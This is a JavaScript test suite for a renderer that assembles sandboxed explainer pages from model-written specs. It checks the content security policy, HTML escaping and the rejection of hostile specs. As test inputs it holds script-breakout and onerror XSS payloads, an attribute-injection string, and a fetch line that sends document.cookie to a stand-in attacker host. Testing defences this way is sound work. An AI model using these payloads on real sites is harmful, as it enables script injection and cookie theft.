/**
 * Assembly of the sandboxed explainer document.
 *
 * The invariants here are the ones that hold when everything else has failed:
 * the CSP is always present, the model never gets to write the head, and a
 * script body cannot break out of its own tag.
 */
const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const {
  renderExplainerHtml,
  explainerAltText,
  neutralizeScriptClose,
  CONTENT_SECURITY_POLICY,
} = require('../visuals/render-html');
const { LIGHT_TOKENS, DARK_TOKENS } = require('../visuals/theme-tokens');

const spec = {
  title: 'Pressure and area',
  summary: 'Drag the slider to change the area a fixed force is spread over, and watch the pressure change.',
  html: '<div id="stage"><input id="area" type="range" min="1" max="10" value="5"><p id="out">Pressure: 20 Pa</p></div>',
  css: '#stage { color: var(--ink); background: var(--surface-2); }',
  js: 'const a = document.getElementById("area"); a.addEventListener("input", () => { document.getElementById("out").textContent = "Pressure: " + (100 / a.value).toFixed(1) + " Pa"; });',
  height: 320,
  citations: ['chunk-1'],
};

const render = (overrides = {}, options = {}) => renderExplainerHtml({ ...spec, ...overrides }, options);

describe('explainer document assembly', () => {
  it('emits a complete standalone document', () => {
    const html = render();
    assert.match(html, /^<!doctype html>/);
    assert.match(html, /<html lang="en"/);
    assert.match(html, /<\/html>\s*$/);
    assert.match(html, /<title>Pressure and area<\/title>/);
  });

  // The CSP is one of the two real controls. If it is ever absent the sandbox
  // is carrying the whole feature alone.
  it('always carries the content security policy', () => {
    const html = render();
    assert.ok(html.includes(`<meta http-equiv="Content-Security-Policy" content="${CONTENT_SECURITY_POLICY}">`));
    assert.match(CONTENT_SECURITY_POLICY, /default-src 'none'/);
    assert.match(CONTENT_SECURITY_POLICY, /base-uri 'none'/);
    assert.match(CONTENT_SECURITY_POLICY, /form-action 'none'/);
  });

  it('permits no network source in the policy', () => {
    // Anything that could name a host would be a route off the page. data: for
    // images is the single deliberate exception and carries no host.
    assert.equal(/https?:/.test(CONTENT_SECURITY_POLICY), false, 'policy must name no scheme that reaches a host');
    assert.equal(/\*/.test(CONTENT_SECURITY_POLICY), false, 'policy must contain no wildcard source');
    assert.match(CONTENT_SECURITY_POLICY, /img-src data:/);
  });

  it('places the model source in the slots it was given, and nowhere else', () => {
    const html = render();
    assert.ok(html.includes(spec.html), 'markup lands in the body');
    assert.ok(html.includes(spec.css), 'styles land in the style block');
    assert.ok(html.includes(spec.js), 'script lands in the script block');
    // The model's markup must sit after the head closes — a spec cannot inject
    // into the head, which is where the controls live.
    assert.ok(html.indexOf(spec.html) > html.indexOf('</head>'), 'model markup is outside the head');
  });

  /**
   * The breakout that a naive assembler gets wrong.
   *
   * An inline <script> ends at the first `</script`, even inside a string. If
   * this is not neutralised, everything after it is parsed as markup — outside
   * the script rules the scan applied, and outside every assumption above it.
   */
  it('stops a script body from closing its own tag', () => {
    const hostile = 'const s = "</script><img src=x onerror=alert(1)>";';
    const html = render({ js: hostile });
    assert.equal(html.includes('</script><img'), false, 'raw breakout must not survive');
    assert.ok(html.includes('<\\/script>'), 'the sequence is escaped for the HTML tokenizer, not for JS');
    // Exactly one real closing tag: ours.
    assert.equal(html.split('</script>').length - 1, 1, 'document must contain exactly one closing script tag');
  });

  it('neutralizeScriptClose leaves the JavaScript meaning unchanged', () => {
    // `<\/` and `</` are the same string to a JS parser, so the code still runs.
    assert.equal(eval(neutralizeScriptClose('"</script>"')), '</script>');
  });

  it('escapes a title carrying markup', () => {
    const html = render({ title: '<img src=x onerror=alert(1)>' });
    assert.ok(html.includes('<title>&lt;img src=x onerror=alert(1)&gt;</title>'));
    assert.equal(/<title><img/.test(html), false);
  });

  // Both palettes always ship, because the student can switch theme while a
  // visual is open and the parent cannot reach into an opaque-origin document
  // to restyle it.
  it('carries both palettes whichever theme was asked for', () => {
    for (const theme of ['', 'light', 'dark']) {
      const html = render({}, { theme });
      assert.ok(html.includes(LIGHT_TOKENS.ink), `light ink missing for theme "${theme}"`);
      assert.ok(html.includes(DARK_TOKENS.ink), `dark ink missing for theme "${theme}"`);
      assert.match(html, /prefers-color-scheme: dark/);
    }
  });

  it('stamps only a recognised theme onto the root element', () => {
    assert.match(render({}, { theme: 'dark' }), /<html lang="en" data-theme="dark">/);
    assert.match(render({}, { theme: 'light' }), /<html lang="en" data-theme="light">/);
    assert.match(render({}, { theme: '' }), /<html lang="en">/);
    // A caller-supplied value never reaches the attribute unfiltered.
    assert.match(render({}, { theme: 'dark" onload="alert(1)' }), /<html lang="en">/);
  });

  /**
   * Defence in depth, stated as a test.
   *
   * This spec never passed the generation-time scan — it is written straight in,
   * the way a spec stored by an older build or reaching the table another way
   * would be. Rendering must refuse it. If this ever passes, the scan has become
   * a generation-time nicety rather than a gate, and the read path is unguarded.
   */
  it('refuses to render a stored spec that would not pass the scan today', () => {
    assert.throws(
      () => render({ js: 'fetch("https://evil.example/steal?c=" + document.cookie)' }),
      /network/i,
      'a hostile spec already in the database must not render'
    );
    assert.throws(() => render({ html: '<div id="a"></div><script>alert(1)</script>' }), /forbidden element/i);
  });

  it('wraps the script so one explainer cannot leak bindings', () => {
    const html = render();
    assert.ok(html.includes('(function(){'), 'script body is wrapped in an IIFE');
  });

  it('describes the explainer in the text alternative', () => {
    assert.equal(explainerAltText(spec), `${spec.title}. ${spec.summary}`);
    assert.equal(explainerAltText({ title: 'A', summary: '' }), 'A');
    assert.equal(explainerAltText(null), '');
  });

  it('renders byte-identically for the same spec and theme', () => {
    assert.equal(render({}, { theme: 'dark' }), render({}, { theme: 'dark' }));
  });
});
